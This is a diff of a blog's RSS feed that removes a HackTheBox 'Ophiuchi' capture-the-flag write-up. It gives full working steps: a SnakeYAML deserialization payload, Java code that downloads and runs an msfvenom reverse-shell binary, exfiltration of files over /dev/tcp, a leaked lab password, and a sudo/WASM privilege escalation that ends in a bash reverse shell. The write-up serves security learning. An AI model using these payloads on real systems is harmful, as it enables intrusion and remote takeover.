@@ -376,863 +376,11 @@ root@ophiuchi:/tmp#
     </item>
     
     <item>
-      <title>HackTheBox - Ophiuchi</title>
-      <link>https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/</link>
-      <pubDate>Fri, 06 Aug 2021 17:52:28 +0700</pubDate>
-      
-      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/</guid>
-      <description>Deserialization attack on YAML and reversing web assembly</description>
-      <content:encoded><![CDATA[<p>Ophiuchi starts off by enumerating a Java web application that offers a service for parsing YAML. The parser is vulnerable to YAML deserialization attack, and exploiting it results in an interactive shell access to the system. Internal enumeration of the system finds a set of user credentials. This user is allowed to run a specific Go program which loads a web assembly file and executes a script file if a certain condition is met. The program loads these files without their absolute path. As a result, the files could be replaced with malicious ones to gain root access.</p>
-<h4 id="skills-learned">Skills Learned</h4>
-<ul>
-<li>YAML deserialization attack</li>
-<li>Web Assembly (WASM)</li>
-<li>Code Analysis (Go &amp; WASM)</li>
-<li>Sudo exploitation</li>
-</ul>
-<h4 id="tools">Tools</h4>
-<ul>
-<li>Nmap</li>
-<li>Java Compiler</li>
-<li><a href="https://github.com/artsploit/yaml-payload">Yaml-payload</a></li>
-<li><a href="https://github.com/WebAssembly/wabt">Wabt</a></li>
-</ul>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="nmap">Nmap</h3>
-<p>A full TCP scan using <code>nmap</code> discovers 2 open ports: SSH on port 22 and an Apache Tomcat servlet on port 8080.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «ophiuchi» «10.10.14.53» 
-$ nmap -p- --reason -oA nmap/10-tcp-allport-ophiuchi 10.10.10.227                                           
-Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-17 10:09 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.227
-Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.056s latency<span class="o">)</span>.
-Not shown: <span class="m">65533</span> closed ports
-Reason: <span class="m">65533</span> resets
-PORT     STATE SERVICE    REASON
-22/tcp   open  ssh        syn-ack ttl <span class="m">63</span>
-8080/tcp open  http-proxy syn-ack ttl <span class="m">63</span>
-
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 77.26 seconds
-
-→ root@kali «ophiuchi» «10.10.14.53» 
-$ nmap -p22,8080 -sC -sV -oA nmap/10-tcp-allport-scripts-ophiuchi 10.10.10.227
-Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-17 10:21 EDT
-Nmap scan report <span class="k">for</span> 10.10.10.227
-Host is up <span class="o">(</span>0.055s latency<span class="o">)</span>.
-
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-8080/tcp open  http    Apache Tomcat 9.0.38
-<span class="p">|</span>_http-title: Parse YAML
-Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 9.35 seconds
-</code></pre></div><h2 id="enumeration">Enumeration</h2>
-<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
-<p>On port 8080, the machine hosts a site that serves a YAML parser service.</p>
-<p><div class="img-container"><img src="imgs/image-20210617212718924.png" alt="image-20210617212718924"  /></div>
-</p>
-<p>When I submit a sample YAML payload, it returns the following message.</p>
-<p><div class="img-container"><img src="imgs/image-20210729200644337.png" alt="image-20210729200644337"  /></div>
-</p>
-<p>But, if I send an invalid payload, for example:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">test: test
-  test: test
-</code></pre></div><p>I get the following results:</p>
-<p><div class="img-container"><img src="imgs/image-20210729200616087.png" alt="image-20210729200616087"  /></div>
-</p>
-<p>From the error above, I noticed the <code>org.yaml.snake.yaml.load</code> package is being used. This package is typically used for <a href="https://www.baeldung.com/java-snake-yaml#basic-usage">YAML deserialization</a>.</p>
-<h2 id="foothold">Foothold</h2>
-<h3 id="shell-as-tomcat">Shell as tomcat</h3>
-<h4 id="snakeyaml-insecure-deserialization---poc">SnakeYAML Insecure Deserialization - PoC</h4>
-<p>Although the web app said the parser feature is temporarily on hold, I&rsquo;m sure that each payload I submit is being processed on the backend.</p>
-<p>Searching on Google  about the Snake YAML deserialization attack, I came across <a href="https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html">this post</a> . I took the payload from that post and modified the URL to point to my HTB IP. I will setup a netcat listener and submit the payload to the parser.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="cp">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p">[</span><span class="w">
-</span><span class="w">  </span><span class="cp">!!java.net.URLClassLoader</span><span class="w"> </span><span class="p">[[</span><span class="w">
-</span><span class="w">    </span><span class="cp">!!java.net.URL</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;http://10.10.14.23/iamf&#34;</span><span class="p">]</span><span class="w">
-</span><span class="w">  </span><span class="p">]]</span><span class="w">
-</span><span class="w"></span><span class="p">]</span><span class="w">
-</span></code></pre></div><p>On my listener, I get the following request.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «ophiuchi» «10.10.14.23» 
-$ nc -nvlp <span class="m">80</span>
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
-connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">53002</span>
-GET /iamf HTTP/1.1
-User-Agent: Java/11.0.8
-Host: 10.10.14.23
-Accept: text/html, image/gif, image/jpeg, *<span class="p">;</span> <span class="nv">q</span><span class="o">=</span>.2, */*<span class="p">;</span> <span class="nv">q</span><span class="o">=</span>.2
-Connection: keep-alive
-</code></pre></div><p><div class="img-container"><img src="imgs/image-20210729202237145.png" alt="image-20210729202237145"  /></div>
-</p>
-<p>That means the parser is vulnerable to insecure deserialization attack!</p>
-<h4 id="snakeyaml-insecure-deserialization---weaponize">SnakeYAML Insecure Deserialization - Weaponize</h4>
-<p>The researcher on the previous post uses a <code>.jar</code> payload from <a href="https://github.com/artsploit/yaml-payload">this Github repo</a> to get a code execution. I will clone that repo to my machine.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ git clone https://github.com/artsploit/yaml-payload.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> yaml-payload
-Cloning into <span class="s1">&#39;yaml-payload&#39;</span>...
-remote: Enumerating objects: 10, <span class="k">done</span>.
-remote: Total <span class="m">10</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">10</span>
-Receiving objects: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.
-</code></pre></div><p>From that repo, I will modify the codes of <code>AwesomeScriptEngineFactory.java</code> file to make it executes a sequence OS commands that will grab my malicious binary and execute it afterwards.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">artsploit</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">javax.script.ScriptEngine</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">javax.script.ScriptEngineFactory</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">AwesomeScriptEngineFactory</span> <span class="kd">implements</span> <span class="n">ScriptEngineFactory</span> <span class="o">{</span>
-
-    <span class="kd">public</span> <span class="nf">AwesomeScriptEngineFactory</span><span class="o">()</span> <span class="o">{</span>
-        <span class="k">try</span> <span class="o">{</span>
-            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;wget http://10.10.14.23/iamf-shell -O /tmp/iamf-shell;&#34;</span><span class="o">);</span>
-            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;chmod +x /tmp/iamf-shell&#34;</span><span class="o">);</span>
-            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;/tmp/iamf-shell&#34;</span><span class="o">);</span>
-        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-    <span class="o">}</span>
-    
-<span class="o">...[</span><span class="n">SNIP</span><span class="o">]...</span>
-<span class="o">}</span>
-
-</code></pre></div><p>Next, I will compile the code and pack the whole <code>src/</code> folder into a java archive (jar) file.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «yaml-payload» «10.10.14.23» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
-$  javac src/artsploit/AwesomeScriptEngineFactory.java <span class="o">&amp;&amp;</span> jar -cvf yaml-payload.jar -C src/ .
-Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class="o">=</span>on -Dswing.aatext<span class="o">=</span><span class="nb">true</span>
-adding: META-INF/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
-adding: META-INF/MANIFEST.MF <span class="o">(</span><span class="nv">in</span><span class="o">=</span>56<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>56<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
-adding: ./ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
-adding: META-INF/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
-adding: META-INF/services/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
-adding: META-INF/services/javax.script.ScriptEngineFactoed -5%<span class="o">)</span>
-adding: artsploit/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
-adding: artsploit/AwesomeScriptEngineFactory.class <span class="o">(</span><span class="nv">in</span><span class="o">=</span>1%<span class="o">)</span>
-adding: artsploit/AwesomeScriptEngineFactory.java~ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>5<span class="o">)</span>
-adding: artsploit/AwesomeScriptEngineFactory.java <span class="o">(</span><span class="nv">in</span><span class="o">=</span>16<span class="o">)</span>
-Total:
-------
-<span class="o">(</span><span class="nv">in</span> <span class="o">=</span> 4083<span class="o">)</span> <span class="o">(</span><span class="nv">out</span> <span class="o">=</span> 2846<span class="o">)</span> <span class="o">(</span>deflated 30%<span class="o">)</span>
-</code></pre></div><p>Then I will create my malicious binary using <code>msfvenom</code>. This binary along with the jar will be hosted using a Python web server.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ msfvenom -p linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.23 <span class="nv">lport</span><span class="o">=</span><span class="m">53</span> -f elf -o iamf-shell
-<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: <span class="m">74</span> bytes
-Final size of elf file: <span class="m">194</span> bytes
-Saved as: iamf-shell
-</code></pre></div><p>Finally, I will setup a netcat listener and submit the following payload.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="cp">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p">[</span><span class="w">
-</span><span class="w">  </span><span class="cp">!!java.net.URLClassLoader</span><span class="w"> </span><span class="p">[[</span><span class="w">
-</span><span class="w">    </span><span class="cp">!!java.net.URL</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;http://10.10.14.23/yaml-payload.jar&#34;</span><span class="p">]</span><span class="w">
-</span><span class="w">  </span><span class="p">]]</span><span class="w">
-</span><span class="w"></span><span class="p">]</span><span class="w">
-</span></code></pre></div><p>Within a few seconds, I get an interactive shell as tomcat.</p>
-<p><div class="img-container"><img src="imgs/image-20210729220701287.png" alt="image-20210729220701287"  /></div>
-</p>
-<h4 id="shell-upgrade">Shell Upgrade</h4>
-<p>As usual, I will do the PTY trick to upgrade my shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">which script
-/usr/bin/script                                                     
-script /dev/null -c bash                                            
-Script started, file is /dev/null                                   
-tomcat@ophiuchi:/$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
-tomcat@ophiuchi:/$ ^Z 
-<span class="o">[</span>2<span class="o">]</span>  + <span class="m">7400</span> suspended  nc -nvlp <span class="m">53</span>
-→ kali@kali «exploits» «10.10.14.23» 
-$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>
-<span class="o">[</span>2<span class="o">]</span>  - <span class="m">7400</span> continued  nc -nvlp <span class="m">53</span>
-
-tomcat@ophiuchi:/$ stty rows <span class="m">30</span> cols <span class="m">126</span>
-</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
-<h3 id="shell-as-admin">Shell as admin</h3>
-<h4 id="enumeration-1">Enumeration</h4>
-<p>There are only two users in this machine who have login shell: <code>root</code> and <code>admin</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">tomcat@ophiuchi:/opt/tomcat$ cat /etc/passwd <span class="p">|</span> grep sh$
-root:x:0:0:root:/root:/bin/bash
-admin:x:1000:1000:,,,:/home/admin:/bin/bash
-</code></pre></div><p>Using <code>grep</code> to search for a &ldquo;password&rdquo; recursively on the tomcat home directory (<code>/opt/tomcat</code>) reveals a set of credentials for user <code>admin</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">tomcat@ophiuchi:/opt/tomcat$ grep -Ri <span class="s2">&#34;password&#34;</span> 
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-conf/tomcat-users.xml:&lt;user <span class="nv">username</span><span class="o">=</span><span class="s2">&#34;admin&#34;</span> <span class="nv">password</span><span class="o">=</span><span class="s2">&#34;whythereisalimit&#34;</span> <span class="nv">roles</span><span class="o">=</span><span class="s2">&#34;manager-gui,admin-gui&#34;</span>/&gt;     ...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><h4 id="ssh---admin">SSH - admin</h4>
-<p>The password <code>whythereisalimit</code>  works on SSH for user <code>admin</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ ssh admin@10.10.10.227 
-admin@10.10.10.227<span class="err">&#39;</span>s password: 
-Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-51-generic x86_64<span class="o">)</span>
-
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-
-  System load:             0.08
-  Usage of /:              19.9% of 27.43GB
-  Memory usage:            17%
-  Swap usage:              0%
-  Processes:               <span class="m">214</span>
-  Users logged in:         <span class="m">0</span>
-  IPv4 address <span class="k">for</span> ens160: 10.10.10.227
-  IPv6 address <span class="k">for</span> ens160: dead:beef::250:56ff:feb9:90cf
-
-
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-
-Last login: Mon Jan <span class="m">11</span> 08:23:12 <span class="m">2021</span> from 10.10.14.2
-admin@ophiuchi:~$ id
-<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>admin<span class="o">)</span>
-</code></pre></div><p>User flag is done here.</p>
-<h3 id="shell-as-root">Shell as root</h3>
-<h4 id="enumeration-2">Enumeration</h4>
-<p>User <code>admin</code> is allowed to run a Go program as root.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:~$ sudo -l
-Matching Defaults entries <span class="k">for</span> admin on ophiuchi:
-    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
-
-User admin may run the following commands on ophiuchi:
-    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
-</code></pre></div><h4 id="source-code-analysis---indexgo">Source Code Analysis - index.go</h4>
-<p>What <code>index.go</code> does is:</p>
-<ul>
-<li>It reads a web assembly file called <code>main.wasm</code> and creates an instance of that file.</li>
-<li>It then exports a function called &ldquo;info&rdquo; from the instance and executes it. If the results of that function is &ldquo;1&rdquo;, it runs the <code>deploy.sh</code> file.</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">main</span>
-
-<span class="kn">import</span> <span class="p">(</span>
-        <span class="s">&#34;fmt&#34;</span>
-        <span class="nx">wasm</span> <span class="s">&#34;github.com/wasmerio/wasmer-go/wasmer&#34;</span>
-        <span class="s">&#34;os/exec&#34;</span>
-        <span class="s">&#34;log&#34;</span>
-<span class="p">)</span>
-
-
-<span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-        <span class="nx">bytes</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nf">ReadBytes</span><span class="p">(</span><span class="s">&#34;main.wasm&#34;</span><span class="p">)</span>
-
-        <span class="nx">instance</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">wasm</span><span class="p">.</span><span class="nf">NewInstance</span><span class="p">(</span><span class="nx">bytes</span><span class="p">)</span>
-        <span class="k">defer</span> <span class="nx">instance</span><span class="p">.</span><span class="nf">Close</span><span class="p">()</span>
-        <span class="nx">init</span> <span class="o">:=</span> <span class="nx">instance</span><span class="p">.</span><span class="nx">Exports</span><span class="p">[</span><span class="s">&#34;info&#34;</span><span class="p">]</span>
-        <span class="nx">result</span><span class="p">,</span><span class="nx">_</span> <span class="o">:=</span> <span class="nf">init</span><span class="p">()</span>
-        <span class="nx">f</span> <span class="o">:=</span> <span class="nx">result</span><span class="p">.</span><span class="nf">String</span><span class="p">()</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nx">f</span> <span class="o">!=</span> <span class="s">&#34;1&#34;</span><span class="p">)</span> <span class="p">{</span>
-                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Not ready to deploy&#34;</span><span class="p">)</span>
-        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;Ready to deploy&#34;</span><span class="p">)</span>
-                <span class="nx">out</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">exec</span><span class="p">.</span><span class="nf">Command</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="s">&#34;deploy.sh&#34;</span><span class="p">).</span><span class="nf">Output</span><span class="p">()</span>
-                <span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
-                        <span class="nx">log</span><span class="p">.</span><span class="nf">Fatal</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span>
-                <span class="p">}</span>
-                <span class="nx">fmt</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="nb">string</span><span class="p">(</span><span class="nx">out</span><span class="p">))</span>
-        <span class="p">}</span>
-<span class="p">}</span>
-
-</code></pre></div><p>Also, it&rsquo;s important to note that this <code>index.go</code> loads  <code>deploy.sh</code> and <code>main.wasm</code> with relative path. The <code>deploy.sh</code> and <code>main.wasm</code> themself can be found under <code>/opt/wasm-functions</code> directory.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/opt/wasm-functions$ ls -lah
-total 3.9M
-drwxr-xr-x <span class="m">3</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> .
-drwxr-xr-x <span class="m">5</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> ..
-drwxr-xr-x <span class="m">2</span> root root 4.0K Oct <span class="m">14</span>  <span class="m">2020</span> backup
--rw-r--r-- <span class="m">1</span> root root   <span class="m">88</span> Oct <span class="m">14</span>  <span class="m">2020</span> deploy.sh
--rwxr-xr-x <span class="m">1</span> root root 2.5M Oct <span class="m">14</span>  <span class="m">2020</span> index
--rw-rw-r-- <span class="m">1</span> root root  <span class="m">522</span> Oct <span class="m">14</span>  <span class="m">2020</span> index.go
--rwxrwxr-x <span class="m">1</span> root root 1.5M Oct <span class="m">14</span>  <span class="m">2020</span> main.wasm
-</code></pre></div><p>The <code>deploy.sh</code> contains a to-do note of a lazy admin.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
-<span class="c1">#!/bin/bash</span>
-
-<span class="c1"># ToDo</span>
-<span class="c1"># Create script to automatic deploy our new web at tomcat port 8080</span>
-</code></pre></div><p>From here, I will exfil the entire <code>/opt/wasm-functions/</code> to my machine.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">admin@ophiuchi:/opt$ tar -czvf /tmp/wasm-functions.tar.gz wasm-functions/
-wasm-functions/
-wasm-functions/index
-wasm-functions/index.go
-wasm-functions/deploy.sh
-wasm-functions/main.wasm
-wasm-functions/backup/
-wasm-functions/backup/index.go
-wasm-functions/backup/deploy.sh
-wasm-functions/backup/main.wasm
-admin@ophiuchi:/opt$ cat /tmp/wasm-functions.tar.gz &gt; /dev/tcp/10.10.14.23/53
-</code></pre></div><p>On my listener:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ nc -nvlp <span class="m">53</span> &gt; wasm-functions.tar.gz
-listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
-connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">45380</span>
-</code></pre></div><h4 id="reversing-mainwasm">Reversing main.wasm</h4>
-<p>WASM can be {de,re}compiled using a tool, called <a href="https://github.com/WebAssembly/wabt/">wabt</a>. I will clone the repo and make the tool available to system-wide.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz -O /opt/
-$ tar -xvf /opt/wabt-1.0.23-ubuntu.tar.gz
-$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="s2">&#34;/opt/wabt-1.0.23/bin&#34;</span>:<span class="nv">$PATH</span>
-</code></pre></div><p>I will decompile the <code>main.wasm</code> using <code>wasm-decompile</code>, and it reveals that the <code>info</code> function has return value of 0.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «wasm-functions» «10.10.14.23» 
-$ wasm-decompile main.wasm 
-<span class="nb">export</span> memory memory<span class="o">(</span>initial: 16, max: 0<span class="o">)</span><span class="p">;</span>
-
-global g_a:int <span class="o">=</span> 1048576<span class="p">;</span>
-<span class="nb">export</span> global data_end:int <span class="o">=</span> 1048576<span class="p">;</span>
-<span class="nb">export</span> global heap_base:int <span class="o">=</span> 1048576<span class="p">;</span>
-
-table T_a:funcref<span class="o">(</span>min: 1, max: 1<span class="o">)</span><span class="p">;</span>
-
-<span class="nb">export</span> <span class="k">function</span> info<span class="o">()</span>:int <span class="o">{</span>
-  <span class="k">return</span> <span class="m">0</span>
-<span class="o">}</span>
-</code></pre></div><h4 id="exploitation">Exploitation</h4>
-<p>I needed a return value of 1, so that <code>index.go</code> will execute the <code>deploy.sh</code>, therefore I will need to modify the <code>main.wasm</code> using <code>wasm2wat</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ wasm2wat ../loot/wasm-functions/main.wasm <span class="p">|</span> tee main.wat
-<span class="o">(</span>module
-  <span class="o">(</span><span class="nb">type</span> <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>func <span class="o">(</span>result i32<span class="o">)))</span>
-  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
-    i32.const 0<span class="o">)</span>
-  <span class="o">(</span>table <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="m">1</span> <span class="m">1</span> funcref<span class="o">)</span>
-  <span class="o">(</span>memory <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> 16<span class="o">)</span>
-  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>0<span class="p">;</span><span class="o">)</span> <span class="o">(</span>mut i32<span class="o">)</span> <span class="o">(</span>i32.const 1048576<span class="o">))</span>
-  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>1<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
-  <span class="o">(</span>global <span class="o">(</span><span class="p">;</span>2<span class="p">;</span><span class="o">)</span> i32 <span class="o">(</span>i32.const 1048576<span class="o">))</span>
-  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;memory&#34;</span> <span class="o">(</span>memory 0<span class="o">))</span>
-  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;info&#34;</span> <span class="o">(</span>func <span class="nv">$info</span><span class="o">))</span>
-  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;__data_end&#34;</span> <span class="o">(</span>global 1<span class="o">))</span>
-  <span class="o">(</span><span class="nb">export</span> <span class="s2">&#34;__heap_base&#34;</span> <span class="o">(</span>global 2<span class="o">)))</span>
-</code></pre></div><p>Then in <code>main.wat</code>, I will modify the return value of the info function to 1.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">...<span class="o">[</span>SNIP<span class="o">]</span>...
-  <span class="o">(</span>func <span class="nv">$info</span> <span class="o">(</span><span class="nb">type</span> 0<span class="o">)</span> <span class="o">(</span>result i32<span class="o">)</span>
-    i32.const 1<span class="o">)</span>
-...<span class="o">[</span>SNIP<span class="o">]</span>...
-</code></pre></div><p>I will compile the <code>main.wat</code> back to <code>main.wasm</code> using <code>wat2wasm</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ wat2wasm main.wat 
-</code></pre></div><p>Then I will create my own <code>deploy.sh</code> that contains a reverse shell.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ cat deploy.sh 
-<span class="c1">#!/bin/sh</span>
-bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.23/53 0&gt;&amp;1&#34;</span>
-</code></pre></div><p>I will transfer my <code>main.wasm</code> and <code>deploy.sh</code> using <code>scp</code> to<code>/tmp/</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
-$ scp main.wasm deploy.sh  admin@10.10.10.227:/tmp
-admin@10.10.10.227<span class="err">&#39;</span>s password: 
-main.wasm                                                                                   100%  <span class="m">112</span>     1.7KB/s   00:00    
-deploy.sh                                                                                   100%   <span class="m">60</span>     1.1KB/s   00:00 
